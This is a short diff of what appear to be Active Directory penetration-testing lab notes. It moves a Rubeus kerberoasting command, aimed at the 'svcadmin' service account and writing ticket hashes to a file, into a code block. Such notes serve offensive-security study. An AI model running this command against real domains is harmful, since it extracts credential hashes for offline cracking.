@@ -590,6 +590,6 @@ Get-DomainUser -SPN
 ```
 ![[Pasted image 20231025153253.png]]
 We try to kerberoast it 
-
-C:\AD\Tools\Rubeus.exe kerberoast /user:svcadmin /simple 
-/rc4opsec /outfile:C:\AD\Tools\hashes.txt
+```cmd
+C:\AD\Tools\Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
+```
